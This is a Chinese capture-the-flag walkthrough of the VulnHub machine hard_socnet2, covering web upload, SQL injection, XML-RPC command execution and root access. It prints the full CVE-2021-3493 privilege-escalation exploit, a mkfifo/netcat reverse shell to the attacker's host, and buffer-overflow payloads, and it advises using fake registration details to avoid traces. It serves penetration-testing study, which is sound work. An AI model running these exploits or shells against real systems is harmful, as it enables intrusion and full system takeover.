# 相关信息

kali：1.0.0.3/24

靶机：1.0.0.4/24

靶机下载：https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova

难度：高

目标：获取root权限

# 文字思路

## 全流程思路：

- 主机发现	端口扫描	

- sql注入：和提权无关，但是我认为非常非常的重要	

- 文件上传	蚁剑上线	

- XMLRPC命令执行：需要现学一下 `xmlrpc`模块，然后写一下简单的脚本来进行反弹shell

- ==逆向工程==：重中之重，学会使用 `gdb`工具

- ==动态调试==：掌握 `gdb`的各种使用方法，同时学会理解汇编语言审计的大致思路

- ==漏洞利用代码的编写==：明确大小端

    

## 下意识的操作

1. 对于任何具有 `sql`注入嫌疑的地方（搜索框，get/post参数和网页的各个源码等），我们都要进行注入的尝试。
1. 有时通过蚁剑，msf等其他现成的漏洞连接工具的得到的 `shell`很有可能是功能不全的，没有`nc`的好用
1. 如果在拿到的 `shell`中没有回显很快是你没有升级 `shell`
1. 在缓冲区溢出漏洞的时候一定要了解目标机器的寄存器是大端结构还是小端结构，这一点对缓冲区溢出的成功与否非常重要

## 主要的知识点

1. 新漏洞的利用 `CVE-2021-3493`
1. 缓冲区溢出漏洞的发现
1. `gdb`调试工具的使用

# 具体流程

## 信息搜集

1. 发现主机，版本扫描。发现靶机是开放了两个 `http`的服务 `80,8000`，同时还开启了 `22：ssh/OpenSSH`但是我们后续的渗透测试并没有用到该端口。

    <img src="https://image.cchl.fun/kali_image/image-20230603155306784.png" alt="image-20230603155306784" style="zoom:50%;" />

2. 当我们访问网站的时候（尤其是 `8000` 端口），我们发现了一个非常奇怪的现象，那就是这个端口上的网页居然==不支持我们 GETweb访问形式来访问网站，，POST等其他的网站请求形式也是没有任何回显的==。

    <img src="https://image.cchl.fun/kali_image/image-20230603155600084.png" alt="image-20230603155600084" style="zoom: 67%;" />

    <img src="https://image.cchl.fun/kali_image/image-20230603155818695.png" alt="image-20230603155818695" style="zoom: 67%;" />

3. 然后我们再访问 `80`端口，该`web`服务是一个登陆和注册页面。由于是按照邮箱被视为账号，就导致我们进行弱密码猜解和爆破是不大可能的，我们尝试 `sign up`一个账户看看。（==建议在真实的渗透或者网络攻防中如果有类似需要注册的页面的时候我们填写的信息建议都为虚假的，防止自己痕迹的泄露。==）

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-03_16-03-29.png" alt="Snipaste_2023-06-03_16-03-29" style="zoom: 67%;" />

    当我们进入页面后我们发现一个非常有用的信息，`admin`用户说他上传了个 `monitor.py`的监控脚本（暂且记下，因为我们目前还无法进行相关的测试）。

    <img src="https://image.cchl.fun/kali_image/1.png" alt="1" style="zoom:67%;" />

    后台基本就是一个各个用户间相互讨论的的一个网址，我们其实还有个思路就是浏览各个用户的 `profile`。收集各个用户的相关信息，如果得到各个用户的邮箱我们就可以尝试进行密码的爆破。（==可惜我们无法收集到相关的邮箱信息==）

## 后台漏洞

### 上传漏洞

1. 当我们进入 `profile`时，我们发现是可以上传图片来修改我们的头像的（==更换头像的这个功能，必须在我们在后台发布评论后才能使用==）。通过我的测试发现这个上传竟然没有任何的过滤，我们上传一个 `payload.php`都是可以的。所以直接输入一句话的后门，便可以通过蚁剑拿下`shell`。（由于我们上传的不是图片文件，所以头像还是空白。但是点击头像选择复制连接，即可获得后门代码在靶机上的路径）

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-03_16-25-30.png" alt="Snipaste_2023-06-03_16-25-30" style="zoom: 50%;" />
    
    <img src="https://image.cchl.fun/kali_image/image-20230606184141022.png" alt="image-20230606184141022" style="zoom:67%;" />

### sql注入漏洞

> 与提取没有任何的关系，但是我还是认为这个测试是==非常非常重要的==

1. 当对后台的搜索框进行漏洞注入测试的时候，可以发现明显的 `sql`注入漏洞。输入特殊字符 `'` 的时候，会引发后台数据库的报错甚至还将报错的具体内容进行了回显。

    <img src="https://image.cchl.fun/kali_image/image-20230606184412236.png" alt="image-20230606184412236" style="zoom:50%;" />

2. 所以直接 `buprsuite`抓包，然后`sqlmap`一步一步的将整个数据库的数据 `dump`下来（这个漏洞太简单了，根本不涉及什么绕过编码什么的）

    - `sqlmap -r 数据包 -p query`：判断是否有注入点

    <img src="https://image.cchl.fun/kali_image/image-20230606184733438.png" alt="image-20230606184733438" style="zoom:67%;" />

    - `sqlmap -r 数据包 -p query --dbs`：爆出相关的数据库

    <img src="https://image.cchl.fun/kali_image/image-20230606184757802.png" alt="image-20230606184757802" style="zoom:50%;" />

    - `sqlmap -r 数据包 -p query -D socialnetwork --tables`：爆出各种表名

    <img src="https://image.cchl.fun/kali_image/image-20230606184835505.png" alt="image-20230606184835505" style="zoom: 67%;" />

    - `sqlmap -r 数据包 -p query -D socialnetwork -T users --columns`：获取users的各个列

    <img src="https://image.cchl.fun/kali_image/image-20230606184952271.png" alt="image-20230606184952271" style="zoom:50%;" />
    
    - `sqlmap -r 数据包 -p query -D socialnetwork -T users -C user_emil,user_passwd --dump`：获取相关的邮箱和登陆密码，同时在注入的过程中选择 `sqlmap`的`hash`爆破功能获取相关的密码
    
        <img src="https://image.cchl.fun/kali_image/image-20230606185555105.png" alt="image-20230606185555105" style="zoom: 50%;" />
    

然后通过的到的数据，直接以`admin`身份来登陆 `80`端口的网站，但是我们发现即使登陆后也是没有什么大的漏洞。即和我们自己注册的用户来进行上文件的漏洞效果是一样的。

## 提取漏洞1.0

> 第一种提权思路，但是这个思路利用的漏洞在当时靶机发布的时候是不知道的。所以该靶机其实还有提权漏洞2.0，既第二种方法。

1. 先进行基本的信息收集，通过 `lsb_release -a`命令来具体查看系统的发行版本为：`ubuntu 18.04.1 LTS` ，该版本的操作系统符合 `CVE-2021-3493`提取漏洞的版本条件。

    [==漏洞的具体理解和利用脚本==](#tag1)<a id='back1'></a>

    ![image-20230606190553883](https://image.cchl.fun/kali_image/image-20230606190553883.png)

2. 尝试该漏洞是否能成功的使用，利用蚁剑的文件上传功能，将该脚本上传到靶机的 `/tmp`目录。然后在靶机上编译执行，但是我们发现没有执行的权限。所以我复制文件，切换目录再次尝试。提示我们通过蚁剑获取的 `shell`功能是不全面的，无法正常的执行 `exp`。提示 `no job control in this shell`

    <img src="https://image.cchl.fun/kali_image/image-20230606192003206.png" alt="image-20230606192003206" style="zoom: 67%;" />

3. 所以我们通过蚁剑的 `shell`尝试反弹 `shell`,拿到一个功能更加全面的 `shell`

    <img src="https://image.cchl.fun/kali_image/image-20230606192147869.png" alt="image-20230606192147869" style="zoom:67%;" />

    但是我们发现是没有 `nc`是没有 `-e`参数的。这里我们可以使用 `nc`串联的技术，但是我们使用另一种方法可以实现同样的反弹效果，甚至交互性比串联 `nc`来的更好，直接在蚁剑`shell`键入下面的命令就可以成功的反弹 `shell`。

    ```bash
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 1.0.0.3 4444 >/tmp/f 
    ```

    [==该命令的详细解释==](#back2)<a id='tag2'></a>

4. 下面的就是执行 `exp`的简单命令，发现直接成功的提权代为 `root`。

    <img src="https://image.cchl.fun/kali_image/image-20230606193139315.png" alt="image-20230606193139315" style="zoom: 50%;" />

    

## 提权漏洞2.0

> 这个提权思路是非常难的，需要大量的高阶知识，与此同时会伴随着大量的小漏洞利用和信息搜集。所以我们回到那个低权限的 `www`用户。而且其实我们不许通过xml漏洞跳转到 `socnet`用户的，在对缓冲区溢出漏洞的所有发现和调试都是可以直接通过 `www`就是可以实现的。

### 信息收集/xml漏洞

1. 首先查看 `/etc/passwd`文件，发现 `socnet`是拥有 `/bin/bash`的。

    ![Snipaste_2023-06-06_19-41-44](https://image.cchl.fun/kali_image/Snipaste_2023-06-06_19-41-44.png)

2. 进入 `socnet`用户主目录， 我们依次的分析每个文件的作用，同时进行代码审计。

    <img src="https://image.cchl.fun/kali_image/image-20230607105521950.png" alt="image-20230607105521950" style="zoom:67%;" />

    - `peda`：为GDB设计的一个强大的插件

    - `add_record`：一个交互程序，根据你对问题的回答生成一个 `.txt`文件。

    - `monitor.py`：就是我们刚刚在后台看到的 `admin`用户上传的一个监控脚本。下面为官方文档链接和部分代码的审计

        [xmlrpc --- XMLRPC 服务端与客户端模块 — Python 3.11.3 文档](https://docs.python.org/zh-cn/3/library/xmlrpc.html)

        
        
        ```python
        import SimpleXMLRPCServer	# 这是一个远程调用程序的一个py模块，可以去官网查看相关的函数说明，非常简单。
        debugging_pass = random.randint(1000,9999)	# 随机生成一个正数范围内的debugging_pass
        
        def runcmd(cmd):
            results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)	# 就是开启一个子程序在shell中来执行我们的cmd命令，
            output = results.stdout.read() + results.stderr.read() # 定义stdout,stderr是用对results对象相关属性的设定
            return output	# 将执行的结果进行返回
        
        def net():	# 调用runcmd函数来执行ip a函数，来查看系统的网卡信息
            return runcmd("ip a")
        
        def secure_cmd(cmd,passcode):	#如果传入的passcode等于随机生成的debugging_pass，该函数就会执行我们输入
            if passcode==debugging_pass:	#任何的cmd命令
                 return runcmd(cmd)
            else:
                return "Wrong passcode."
        server = SimpleXMLRPCServer.SimpleXMLRPCServer(("0.0.0.0", 8000))	# 一种默认的写法，在8000端口开放，这也解释
        server.register_function(net)	# 我们为什么无法通过常规的web访问访问端口，因为该段口是给 该py模块开启的http服务
        server.register_function(secure_cmd)	# 定义可以远程执行的命令有哪些
        ```
        

> 这段代码的大致意思就是在服务端的`8000`端口开放一个远程执行的代码。只是我们如果想让该远程执行代码执行我们任意输入的命令需要知道随机生成的`debugging_pass`

### 反弹shell

1. 在官网的文档中 `dump`下客服端的基本代码，然后通过简单的修改爆破得出 `debugging_pass`的值为 `2591`。脚本代码也是非常简单的易懂，不再给出。

<img src="https://image.cchl.fun/kali_image/image-20230607164708331.png" alt="image-20230607164708331" style="zoom: 50%;" />

3. 然后就是给出反弹的 `shell`命令，使用的反弹 `shell`也为上文用的方法。成功的反弹 `shell`

    <img src="https://image.cchl.fun/kali_image/image-20230607165420949.png" alt="image-20230607165420949" style="zoom: 50%;" />

### 缓冲区漏洞之发现

1. 通过浏览本用户已目录下的 `add_record`我们可以发现程序是具有可执行权限，`suid`权限的，而且还是有`root`创建的。这就基本提示我们要通过这个 `suid`来进行相关的提权。

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_20-49-45.png" alt="Snipaste_2023-06-07_20-49-45" style="zoom:67%;" />

    > 我们不妨输入 `./add_record`来运行这个可执行程序，通过我简单的摸索基本可以大致了解他的作用：
    >
    > 询问我们的相关职业，然后将我们的输入记录下来然后生成一个关于我们职业的 `.txt`文档。

2. 明确基本的使用方法后我们来尝试判断目标程序是否具有缓冲区漏洞（原因：1，我们可以控制部分输入    2，他的`suid`权限提示非常明显极度的暗示）。由于我们在该目标靶机中发现了 `peda`插件，我们肯定靶机上有 `gdb`这个调试工具。

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_20-49-45.png" alt="Snipaste_2023-06-07_20-49-45" style="zoom:67%;" />

3. 先通过 `python`生成一个 `200`个 `A`的用于测试缓冲区溢出字符串：`python -c "print('A'*200)"`。然后在靶机的 `socnet：shell`中键入 `gdb -q ./add_record`来让gdb来调试程序，再键入 `r`来正真的让程序跑起来。

    接着在每个可以输入字符的地方粘贴我们的 `A`字符串，虽然有些地方我们输入 `A`字符串后程序会直接崩溃或者 `gdb`会爆出窗口，但是它们每个的寄存器的 `EIP`都是没有被 `A`字符感染的。直到我们在通过下图的 `Explain`询问窗口的时候我们发现程序不仅出错，而且他的 `EIP`被我们的 `A`字符串感染。

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_17-45-15.png" alt="Snipaste_2023-06-07_17-45-15" style="zoom:50%;" />

4. 接下来就是确定感染 `EIP`的是偏移量是多少，我们通过 `gdb:pattern create 200`来生成一个特征字符串（每4个字符都是唯一的）。然后再重新运行程序，在 `Explain`的这个询问字段输入该特征字符，我们可以看到 `EIP溢出为：AHAA`。然后键入 `pattern search`命令来让 `gdb`帮我们找出 `EIP`在我们刚刚输入字符的偏移量是 `62`。

![Snipaste_2023-06-07_17-47-10](https://image.cchl.fun/kali_image/Snipaste_2023-06-07_17-47-10.png)

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-06_19-41-4.png" alt="Snipaste_2023-06-06_19-41-4" style="zoom:67%;" />

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_17-48-28.png" alt="Snipaste_2023-06-07_17-48-28" style="zoom:67%;" />

5. 然后我们利用 `python -c 'print("A" * 62 + BCDE)'`生成一个字符串，再在 ==Explain==的这个字段输入该特征字符的时候我们可以发现 `EIP`被我们输入操控为 `BCDE`，表明我们计算的偏移量为 `62`是正确的。

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_19-20-21.png" alt="Snipaste_2023-06-07_19-20-21" style="zoom: 67%;" />

> 至此我们确定该程序是具有==缓冲区溢出漏洞==的。

### 缓冲区漏洞之审计

1. 输入 `disas main`命令来查看整个程序的汇编语言，来慢慢的理解整个程序的执行逻辑，==以下为部分相关的汇编解释：==

    ```assembly
    0x08048729 <+81>:    call   0x8048520 <fopen@plt>	# 打开 .txt文件，用来记录我们输入的数据
    0x0804873e <+102>:   call   0x80484e0 <puts@plt>	# 将字符串输出到标准输出设备
    0x08048743 <+107>:   add    esp,0x10
    0x0804874f <+119>:   push   eax
    0x08048750 <+120>:   call   0x8048480 <printf@plt>	# 将puts的输入打印到屏幕上，就是程序在屏幕上输出的问题
    0x08048755 <+125>:   add    esp,0x10
    0x0804876a <+146>:   call   0x80484b0 <fgets@plt>	# 获取我们输入的文本
    0x08048834 <+348>:   call   0x80486ad <vuln>	# 给这个函数给予高度的重视，以为这明显是作者自定义的一个函数
    0x080488a6 <+462>:   push   DWORD PTR [ebp-0x1c]
    0x080488a9 <+465>:   call   0x80484c0 <fclose@plt>	# 关闭记录我们输入数据的 .txt文件
    ```

    - `call`：在汇编代码中表示程序即将调用的函数
    - `push`：用于将地址压入到栈中
    - `fopen@plt`：是一个函数符号，它是一个指向函数的指针用来打开一个文件。当程序调用fopen时，它实际上调用了fopen@plt。这是因为在动态链接库中，函数的地址是在运行时解析的，而不是在编译时解析的。@plt是一个过程链接表（PLT）项，它是动态链接器用来解析函数地址的一部分，==也就是说函数后面有 @plt的基本就是系统自带的库函数。==

2. 通过对上面的审计，我们重点对 `vuln`函数来进行审计键入 `disas vuln`来专门查看该函数的汇编代码，在他的汇编代码中出现了 `strcpy`函数。众所周知这个函数是不对输入的长度进行限定的，会导致空间的溢出，由此我们基本可以判断出缓冲区漏洞的产生原因就是该函数 `vuln`中的 `strcpy`函数。

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_19-13-08.png" alt="Snipaste_2023-06-07_19-13-08" style="zoom:67%;" />

3. 通过键入 `info function`命令来查看这个程序有哪些函数（是非常多的，但是我们回翻到最开始的几个函数），我们发现了几个非常有意义的函数：

    - system@plt：用系统调用来执行特定的操作，例如创建进程、打开文件或执行命令等

    - setuid@plt：接受一个参数 `uid`，表示要设置的用户ID，它会尝试将当前进程的有效用户ID设置为指定的值。和 `add_reocrd`具有 `suid`权限相呼应。但奇怪的是我们在主程序的汇编代码中并没有看到调用

        >  `system,setuid`这两个函数其实就是为什么 `add_record` 实现 `suid`权限的解释

    - backdoor：这个名字就是非常非常可疑的，我们可以想象这个函数很有可能就是作者留给我们的解题思路。

    - vuln：已近分析过

        <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_19-11-19.png" alt="Snipaste_2023-06-07_19-11-19" style="zoom: 67%;" />

4. 键入 `disas backdoor`来查看这个函数有什么大致的作用，当我们看到 `backdoor`这个函数调用了 `system,setuid`两个函数刚好解决了我们刚刚对 `system,setuid`没有调用的疑惑。这几乎更加的暗示我们的解题思路是非常可行的：

    通过对 `add_record`函数的缓冲区溢出，调用这个原本没有调用但是程序中存在的函数 `backdoor`，从而具有使用过 `suid`的权限

<img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_19-14-33.png" alt="Snipaste_2023-06-07_19-14-33" style="zoom:50%;" />

5. 结合我上述的理解，我们就可以将 `backdoor`函数的地址 `0x08048678`放入的62个 `A`的后面，将 `backdoor`的地址注入到 `EIP`中，从而让程序执行 `backdoor`这个后面程序。但在构建 `paylaod`的时候，我们必须先确定靶机的是大段还是小端，从而正确的决定 `0x08048678`的写法，好让寄存器在读取 `EIP`的时候能够按照我们的要求读取。

    ```bash
    echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6
    ```

    键入这个命令返回：1为小端，0为大端（==小段是小小，大段是小大。==）。明显我们的靶机为小端，我们是需要对 `0x08048678`进行返向排列的。

    ![Snipaste_2023-06-07_19-27-25](https://image.cchl.fun/kali_image/Snipaste_2023-06-07_19-27-25.png)

6. 所以我们构造了下面的 `payload`，将 `0x08048678`返向排列加入到字符串中，生成字符写入到 `payload`中。然后通过 `r < payload`直接将 `payload`一次性的写入到 `add_record`中。

    ```bash
    python -c 'import struct;print("aa\n1\n1\n1\n"+"A"*62 + struct.pack("<I",0x08048676 )[::-1] )' > payload
    ```

    ![Snipaste_2023-06-07_20-03-28](https://image.cchl.fun/kali_image/Snipaste_2023-06-07_20-03-28.png)

    通过执行后`gdb`的报错可以看出，它识别到了我们程序的不正常执行。同时还报错提示目标程序开辟了一两个新的程序：`/bin/dash, /bin/bash`。这几乎就可以确定我们的缓冲区注入漏洞是成功的越界的执行了 `backdoor`这个程序。

    <img src="https://image.cchl.fun/kali_image/Snipaste_2023-06-07_20-05-15.png" alt="Snipaste_2023-06-07_20-05-15" style="zoom:67%;" />

7. 下面我们退出 `gdb-peda` 就直接在 `socnet`的 `shell`中执行 `cat payload - | ./add_record`。将我们构造的 `payload`输入到目标程序中，我们可以发现成功的拿到 `shell`。<a id='back8'></a>[==为什么加上 - 符号==](#tag8)

    ![Snipaste_2023-06-07_20-20-05](https://image.cchl.fun/kali_image/Snipaste_2023-06-07_20-20-05.png)



# 相关工具/命令

## 命令

### lsb_release -a

查看具体的内核和发现版本

## 工具

### GDB

1. what?

    GDB是GNU开源组织发布的一个强大的UNIX下的程序调试工具。它支持多种编程语言编写的程序，包括C、C++、Go、Objective-C、OpenCL、Ada等¹。GDB主要帮助我们完成以下四个方面的功能：启动你的程序，可以按照你的自定义的要求随心所欲的运行程序；在某个指定的地方或条件下暂停程序；当程序被停住时，可以检查此时你的程序中所发生的事；当你想要改变程序时，可以在停住程序时改变它¹。

2. 具体实例

    1. gdb -q 程序：表示启动功能程序进入调试，`-q`表示启动程序是禁止回显 `gdb`的启动消息。但这个时候 `gdb`并不会立马的运行需要调试的程序，需要你键入 `r`来将程序 `run`起来。
    2. 在GDB中，除了 `s`（单步执行）之外，还有许多其他调试命令可用于检查程序状态、查看变量值、设置断点等。以下是一些常用的GDB调试命令：
    
        - `n`（`next`）：逐行执行当前函数，并跳过函数内部的代码块。
        - `c`（`continue`）：继续执行程序直到遇到下一个断点或程序结束。
    3. 相关命令
        - `r`：将要调试的程序跑起来
        - `break *地址`：记得在地址前加上 `*`，用于添加断点
        - `info break`：显示所有的断点和它对于的相关序号
        - `delete`：删除全部断点，`delete number`删除指定的断点序号
        - `info break`：用于显示所有的函数


### peda

1. what?

    PEDA是一个强大的插件，全称是Python Exploit Development Assistance for GDB，是为GDB设计的一个强大的插件。它增强了GDB的显示，包括在调试过程中着色并显示反汇编代码、寄存器和内存信息。PEDA指令添加了命令以支持调试和利用开发，如aslr、checksec、dumpargs、dumprop等


# 相关payload/脚本

### 大小端的判断

```bash
echo -n I | od -to2 | head -n1 | cut -f2 -d" " | cut -c6
1为小端，0为大端  ;小段是小小，大段是小大。
```



### CVE-2021-3493

1. `CVE-2021-3493`漏洞脚本。直接在靶机上执行就可以拿下`root`的`shell`                    <a id='tag1'></a>            [==返回==](#back1)

    食用方法：编译成功后直接使用即可

    - 影响版本：Ubuntu 20.10，Ubuntu 20.04 LTS，Ubuntu 18.04 LTS， Ubuntu 16.04 LTS，Ubuntu 14.04 ESM （Linux内核版本 < 5.11）
    
    - `gcc exploit.c -o exploit`
    - `./exploit`
    
    ```c
    #define _GNU_SOURCE
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <unistd.h>
    #include <fcntl.h>
    #include <err.h>
    #include <errno.h>
    #include <sched.h>
    #include <sys/types.h>
    #include <sys/stat.h>
    #include <sys/wait.h>
    #include <sys/mount.h>
    int setxattr(const char *path, const char *name, const void *value, size_t size, int flags);
    #define DIR_BASE    "./ovlcap"
    #define DIR_WORK    DIR_BASE "/work"
    #define DIR_LOWER   DIR_BASE "/lower"
    #define DIR_UPPER   DIR_BASE "/upper"
    #define DIR_MERGE   DIR_BASE "/merge"
    #define BIN_MERGE   DIR_MERGE "/magic"
    #define BIN_UPPER   DIR_UPPER "/magic"
    static void xmkdir(const char *path, mode_t mode){
        if (mkdir(path, mode) == -1 && errno != EEXIST)err(1, "mkdir %s", path);}
    static void xwritefile(const char *path, const char *data){
        int fd = open(path, O_WRONLY);if (fd == -1)err(1, "open %s", path);ssize_t len = (ssize_t) strlen(data);
        if (write(fd, data, len) != len)err(1, "write %s", path);close(fd);}
    static void xcopyfile(const char *src, const char *dst, mode_t mode){
        int fi, fo;if ((fi = open(src, O_RDONLY)) == -1)err(1, "open %s", src);
        if ((fo = open(dst, O_WRONLY | O_CREAT, mode)) == -1)err(1, "open %s", dst);
        char buf[4096];ssize_t rd, wr;
        for (;;) {rd = read(fi, buf, sizeof(buf));
        if (rd == 0) {break;} else if (rd == -1) {if (errno == EINTR)continue;err(1, "read %s", src);}
        char *p = buf;while (rd > 0) {wr = write(fo, p, rd);if (wr == -1) {if (errno == EINTR)continue;
        err(1, "write %s", dst);}p += wr;rd -= wr;}}close(fi);close(fo);}
    static int exploit(){
        char buf[4096];sprintf(buf, "rm -rf '%s/'", DIR_BASE);system(buf);
        xmkdir(DIR_BASE, 0777);xmkdir(DIR_WORK,  0777);xmkdir(DIR_LOWER, 0777);
        xmkdir(DIR_UPPER, 0777);xmkdir(DIR_MERGE, 0777);uid_t uid = getuid();gid_t gid = getgid();
    	if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)err(1, "unshare");
        xwritefile("/proc/self/setgroups", "deny");sprintf(buf, "0 %d 1", uid);
        xwritefile("/proc/self/uid_map", buf);sprintf(buf, "0 %d 1", gid);xwritefile("/proc/self/gid_map", buf);
    	sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
        if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)err(1, "mount %s", DIR_MERGE);
        char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
        xcopyfile("/proc/self/exe", BIN_MERGE, 0777);
        if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
            err(1, "setxattr %s", BIN_MERGE);return 0;}
    int main(int argc, char *argv[]){
        if (strstr(argv[0], "magic") || (argc > 1 && !strcmp(argv[1], "shell"))) {setuid(0);
            setgid(0);execl("/bin/bash", "/bin/bash", "--norc", "--noprofile", "-i", NULL);
            err(1, "execl /bin/bash");}
    	pid_t child = fork();if (child == -1)err(1, "fork");
    	if (child == 0) {_exit(exploit());} else {waitpid(child, NULL, 0);
        }execl(BIN_UPPER, BIN_UPPER, "shell", NULL);err(1, "execl %s", BIN_UPPER);}
    ```
    

### 另一种串联nc

1. what?																	[==返回==](#tag2)<a id='back2'></a>

    用于解决 `nc`没有 `-e`参数的问题，但是这种方法比 `nc串联`交互起来更加的方便。其实我也并特别的明白，但是我感觉不是特别的重要，会用就行。

    [Linux反弹Shell方法_rm /tmp/f;_低头观自在的博客-CSDN博客](https://blog.csdn.net/weixin_43873557/article/details/113760881)这个blog写的还是非常不错，非常详尽的。

2. 具体代码

    ```bash
    rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 1.0.0.3 4444 >/tmp/f 
    ```

    - `rm /tmp/f`: 这条命令尝试删除 `/tmp/f` 文件。如果该文件存在，它将被删除。这是为了确保后续的命令正常工作。
    - `mkfifo /tmp/f`: 这条命令创建了一个名为 `/tmp/f` 的命名管道（named pipe）。命名管道可以用作进程间通信的通道。
    - `cat /tmp/f|/bin/bash -i 2>&1`: 这条命令使用 `cat` 命令读取来自 `/tmp/f` 的输入，并将其作为输入提供给 `/bin/bash`（Bash shell）。通过 `-i` 参数，Bash shell以交互模式启动，允许用户与其进行交互。
    - `nc 1.0.0.3 4444 >/tmp/f`: 这条命令使用 `nc` 命令（netcat）建立到 IP 地址为 `1.0.0.3`、端口号为 `4444` 的远程主机的网络连接。然后，它将所有网络连接的输入重定向到 `/tmp/f` 文件中。从而和`cat /tmp/f|/bin/bash -i 2>&1`的 `/tmp/f`形==成一个回路，实现交互的作用。==

    > mkfifo（make FIFO）不是一个函数，而是一个命令行工具。它用于在Linux和其他类Unix操作系统中创建FIFO（First-In, First-Out）命名管道。
    >
    > FIFO是一种特殊类型的文件，用于实现进程间通信（IPC），其中数据按照写入的顺序被读取。FIFO提供了一种无关的进程通信方式，可以被多个进程同时读取和写入。

# 复盘/相关知识

## 重要

### cat -有什么作用

在命令"cat 1.txt - | progress"和"cat 1.txt | progress"之间，存在一个细微但重要的区别。

1. "cat 1.txt - | progress":                                                                                                [==返回==](#back8)<a id='tag8'></a>
    - 这个命令中的 `-` 表示将标准输入作为文件之一处理。它使得"cat"命令能够将文件"1.txt"的内容与标准输入合并，并通过管道将数据传递给"progress"命令进行处理。
    - 这意味着你可以通过标准输入提供额外的内容，与文件"1.txt"的内容一起传递给"progress"命令进行处理。

2. "cat 1.txt | progress":
    - 这个命令中没有使用"-"符号。"cat"命令仅将文件"1.txt"的内容通过管道传递给"progress"命令进行处理。
    - 这种情况下，没有使用标准输入的内容与文件"1.txt"的内容合并，而是仅将文件"1.txt"的内容传递给"progress"命令。

因此，区别在于是否在管道中包含标准输入的内容。如果你希望将标准输入的内容与文件"1.txt"的内容合并传递给"progress"命令，你可以使用"cat 1.txt - | progress"命令。而如果你只想将文件"1.txt"的内容传递给"progress"命令，你可以使用"cat 1.txt | progress"命令。

## 了解

### xmlrpc

一种远程过程调用协议，用于在网络上进行跨平台和跨语言的通信。XML-RPC使用XML格式来编码请求和响应消息，以实现不同系统之间的数据交换和方法调用。

### peda

为 `gdb`的一个调试插件，当在系统中看到该插件的时候，我们应该联想到这个调试工具。